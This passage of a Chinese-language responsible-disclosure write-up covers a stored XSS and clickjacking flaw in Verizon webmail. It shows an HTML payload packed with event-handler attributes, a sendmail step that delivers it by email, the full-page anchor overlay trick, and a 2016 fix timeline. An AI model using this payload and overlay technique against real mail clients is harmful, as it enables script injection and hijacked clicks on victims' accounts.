    onmousemove="console.log(598217)" onmouseout="console.log(425628)" onmouseover="console.log(359441)"
    onmouseup="console.log(687310)" onmousewheel="console.log(823824)" onscroll="console.log(175565)"
    onwheel="console.log(595449)" oncopy="console.log(243603)" oncut="console.log(841770)"
    onpaste="console.log(489332)" onabort="console.log(516667)" oncanplay="console.log(329437)"
    oncanplaythrough="console.log(754238)" oncuechange="console.log(268702)"
    ondurationchange="console.log(455721)" onemptied="console.log(923165)"
    onended="console.log(330716)" onerror="console.log(382133)" onloadeddata="console.log(268470)"
    onloadedmetadata="console.log(934963)" onloadstart="console.log(664605)"
    onpause="console.log(957774)" onplay="console.log(750548)" onplaying="console.log(887438)"
    onprogress="console.log(648208)" onratechange="console.log(742465)" onseeked="console.log(559902)"
    onseeking="console.log(296937)" onstalled="console.log(613468)" onsuspend="console.log(651399)"
    ontimeupdate="console.log(993291)" onvolumechange="console.log(508203)"
    onwaiting="console.log(146149)" onerror="console.log(470459)" onshow="console.log(586099)"
    ontoggle="console.log(739568)" accesskey="test3617" contenteditable="test3617"
    contextmenu="test3617" data-nent="test3617" dir="test3617" draggable="test3617"
    dropzone="test3617" hidden="test3617" id="test3617" spellcheck="test3617"
    style="display:block" tabindex="test3617" title="test3617" translate="test3617">Test
接下来，将一封包含HTML代码的电子邮件发送给我自己的Verizon邮箱，然后在HTML的body中嵌入我们的payload：
    [user@rw verizon-poc]$ head email.txt | less
    Content-Type: text/html;
    Subject: Testing the new email
    Test
    [user@rw verizon-poc]$ sendmail -t ***REMOVED***@verizon.net 
    An interesting message here to entice the user to scroll down.
我将这个新的payload嵌入在电子邮件中，然后发送给我自己的电子邮箱中，并在Webmail客户端中打开了这封邮件。我们可以从下面这张图片中看到，其中的XSS
payload已经被成功触发了：
请大家仔细看看上面所给出的PoC代码，锚点（“标签”）中的style属性将整个弹窗变成了一个可点击的覆盖页面。这也就意味着，无论这个XSS
payload是否是由鼠标滚轮的滚动动作所触发的，其中锚点元素的覆盖物都可以让用户在毫不知情的情况下点击攻击者提供的恶意链接。
**漏洞时间轴**
2016年03月28日：漏洞报告给了Verizon，并提供了相应的漏洞PoC。
2016年04月21日：XSS漏洞成功修复，点击劫持漏洞仍未修复。
2016年04月21日：我向提出Verizon建议，限制style属性的使用以缓解点击劫持攻击所带来的影响。
2016年04月25日：点击劫持漏洞成功修复。
**总结**
Verizon电子邮件客户端中的这个持久型（存储型）XSS漏洞是非常危险的，因为攻击者可以直接将恶意payload发送给目标用户，而且在payload被执行之前，攻击者已经获取到了用户的身份认证数据，因此payload的执行将不会受到任何的限制。虽然很多XSS漏洞在利用之前还需要攻击者进行大量的准备工作，但是这个XSS漏洞只要求用户打开一个攻击者精心制作的电子邮件即可（滚动鼠标的滚轮，即可触发恶意payload）。再配合上这个点击劫持漏洞，攻击者就可以利用这两个漏洞轻松高效地对目标用户发动攻击了。